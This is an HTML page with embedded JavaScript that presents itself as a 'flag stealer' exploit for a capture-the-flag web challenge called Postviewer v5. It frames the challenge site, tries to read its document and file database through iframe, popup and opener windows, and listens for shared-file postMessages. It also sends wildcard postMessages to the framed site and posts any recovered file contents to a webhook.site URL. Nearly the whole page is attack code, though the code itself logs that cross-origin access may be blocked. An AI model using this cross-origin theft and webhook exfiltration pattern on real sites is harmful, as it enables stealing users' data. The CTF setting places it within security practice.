
<!DOCTYPE html>
<html>
<head>
    <title>Postviewer v5 Exploit</title>
    <style>
        body { font-family: Arial, sans-serif; padding: 20px; }
        .log { background: #f0f0f0; padding: 10px; margin: 10px 0; border-left: 4px solid #007cba; }
        .success { border-left-color: #28a745; background: #d4edda; }
        .error { border-left-color: #dc3545; background: #f8d7da; }
        iframe { width: 100%; height: 400px; border: 1px solid #ccc; margin: 10px 0; }
    </style>
</head>
<body>
    <h1>Postviewer v5 Flag Stealer</h1>
    <div id="log"></div>
    
    <h2>Challenge Page (for debugging):</h2>
    <iframe id="challengeFrame" src="https://9m9rfqgk-postviewer5-ff.instancer.2025.ctfcompetition.com/"></iframe>

    <script>
        const TARGET_URL = 'https://9m9rfqgk-postviewer5-ff.instancer.2025.ctfcompetition.com/';
        
        function log(message, type = 'info') {
            const logDiv = document.getElementById('log');
            const entry = document.createElement('div');
            entry.className = `log ${type}`;
            entry.innerHTML = `[${new Date().toLocaleTimeString()}] ${message}`;
            logDiv.appendChild(entry);
            console.log(message);
            
            // Scroll to bottom
            entry.scrollIntoView();
        }

        function exfiltrateFlag(flagContent) {
            log(`üö© FLAG FOUND: ${flagContent}`, 'success');
            
            // Try multiple exfiltration methods
            
            // Method 1: Try to send to a webhook (replace with your own)
            fetch('https://webhook.site/your-unique-url', {
                method: 'POST',
                headers: {'Content-Type': 'text/plain'},
                body: `FLAG: ${flagContent}`
            }).catch(() => log('Webhook failed (expected)', 'error'));
            
            // Method 2: Try to open a new window with the flag
            try {
                const flagWindow = window.open('', '_blank');
                if (flagWindow) {
                    flagWindow.document.write(`<h1>FLAG FOUND!</h1><p><code>${flagContent}</code></p>`);
                }
            } catch (e) {
                log('Failed to open flag window: ' + e.message, 'error');
            }
            
            // Method 3: Log to console and alert
            console.log('üö© FLAG:', flagContent);
            alert('FLAG FOUND: ' + flagContent);
        }

        // Listen for postMessages (in case we can intercept them)
        window.addEventListener('message', function(event) {
            log(`üì® Received postMessage from ${event.origin}: ${JSON.stringify(event.data)}`);
            
            if (event.data && event.data.type === 'share' && event.data.files) {
                log('üéØ Intercepted file share message!', 'success');
                
                event.data.files.forEach(async (fileData, index) => {
                    if (fileData.name === 'flag.txt') {
                        log('üö© Found flag.txt in intercepted message!', 'success');
                        try {
                            const text = await fileData.blob.text();
                            exfiltrateFlag(text);
                        } catch (e) {
                            log('Error reading flag blob: ' + e.message, 'error');
                        }
                    }
                });
            }
        });

        // Main exploit function
        async function exploit() {
            log('üöÄ Starting exploit...');
            
            // Strategy 1: Try to access the iframe directly
            const iframe = document.getElementById('challengeFrame');
            
            // Wait for iframe to load
            iframe.onload = function() {
                log('üìÑ Challenge page loaded in iframe');
                
                setTimeout(() => {
                    try {
                        log('üîç Attempting to access iframe content...');
                        
                        const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
                        if (iframeDoc) {
                            log('‚úÖ Got access to iframe document!', 'success');
                            
                            // Look for file elements
                            const fileElements = iframeDoc.querySelectorAll('[id^="file-"]');
                            log(`üìÅ Found ${fileElements.length} file elements`);
                            
                            // Look for flag file specifically
                            const flagFile = Array.from(fileElements).find(el => 
                                el.textContent && el.textContent.includes('flag.txt')
                            );
                            
                            if (flagFile) {
                                log('üéØ Found flag file element!', 'success');
                                log(`Flag element ID: ${flagFile.id}`);
                                
                                // Try to click it to trigger download/view
                                flagFile.click();
                                
                                // Try to access the database directly
                                const iframeWindow = iframe.contentWindow;
                                if (iframeWindow && iframeWindow.db) {
                                    log('üéØ Found database object!', 'success');
                                    
                                    iframeWindow.db.getFiles().then(files => {
                                        log(`üìö Database contains ${files.length} files`);
                                        
                                        const flagDbFile = files.find(f => f.file && f.file.name === 'flag.txt');
                                        if (flagDbFile) {
                                            log('üö© Found flag in database!', 'success');
                                            
                                            flagDbFile.file.text().then(text => {
                                                exfiltrateFlag(text);
                                            }).catch(e => log('Error reading flag file: ' + e.message, 'error'));
                                        }
                                    }).catch(e => log('Error accessing database: ' + e.message, 'error'));
                                }
                            }
                        } else {
                            log('‚ùå Cannot access iframe content (CORS blocked)', 'error');
                        }
                    } catch (e) {
                        log('‚ùå Iframe access failed: ' + e.message, 'error');
                    }
                }, 2000);
            };
            
            // Strategy 2: Try window.open approach
            setTimeout(() => {
                log('ü™ü Trying window.open approach...');
                
                const popup = window.open(TARGET_URL, '_blank', 'width=800,height=600');
                
                if (popup) {
                    setTimeout(() => {
                        try {
                            log('üîç Attempting to access popup window...');
                            
                            const popupDoc = popup.document;
                            if (popupDoc) {
                                log('‚úÖ Got access to popup document!', 'success');
                                
                                // Same file searching logic as iframe
                                const fileElements = popupDoc.querySelectorAll('[id^="file-"]');
                                log(`üìÅ Found ${fileElements.length} file elements in popup`);
                                
                                // Look for database access
                                if (popup.db) {
                                    log('üéØ Found database in popup!', 'success');
                                    
                                    popup.db.getFiles().then(files => {
                                        const flagFile = files.find(f => f.file && f.file.name === 'flag.txt');
                                        if (flagFile) {
                                            flagFile.file.text().then(exfiltrateFlag);
                                        }
                                    });
                                }
                            } else {
                                log('‚ùå Cannot access popup content (CORS blocked)', 'error');
                            }
                        } catch (e) {
                            log('‚ùå Popup access failed: ' + e.message, 'error');
                        }
                    }, 3000);
                } else {
                    log('‚ùå Failed to open popup (blocked)', 'error');
                }
            }, 5000);

            // Strategy 3: Send malicious postMessage to try to trigger responses
            setTimeout(() => {
                log('üì§ Sending test postMessages...');
                
                // Try to send to the iframe
                try {
                    iframe.contentWindow.postMessage({
                        type: 'request_files'
                    }, '*');
                    
                    iframe.contentWindow.postMessage({
                        type: 'get_flag'
                    }, '*');
                    
                    log('üì§ Sent test messages to iframe');
                } catch (e) {
                    log('‚ùå Failed to send messages to iframe: ' + e.message, 'error');
                }
            }, 7000);
        }

        // Start the exploit when page loads
        window.onload = function() {
            log('üé¨ Page loaded, starting exploit in 2 seconds...');
            setTimeout(exploit, 2000);
        };

        // Also try to exploit any windows that might be opened by the bot
        setInterval(() => {
            // Check if there are any other windows we can access
            if (window.opener && window.opener !== window) {
                try {
                    log('üîç Found opener window, attempting access...');
                    if (window.opener.db) {
                        log('üéØ Found database in opener!', 'success');
                        window.opener.db.getFiles().then(files => {
                            const flagFile = files.find(f => f.file && f.file.name === 'flag.txt');
                            if (flagFile) {
                                flagFile.file.text().then(exfiltrateFlag);
                            }
                        });
                    }
                } catch (e) {
                    // Silent fail
                }
            }
        }, 1000);

    </script>
</body>
</html>
